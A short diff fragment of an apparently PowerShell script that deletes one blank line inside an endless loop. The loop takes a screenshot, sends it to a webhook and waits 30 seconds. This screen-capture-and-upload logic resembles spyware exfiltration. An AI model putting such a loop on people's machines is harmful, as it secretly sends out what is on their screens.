@@ -40,5 +40,4 @@ while($true) {
     $img = Capture-Screen
     Send-ToWebhook $img
     Start-Sleep -Seconds 30
-
 }
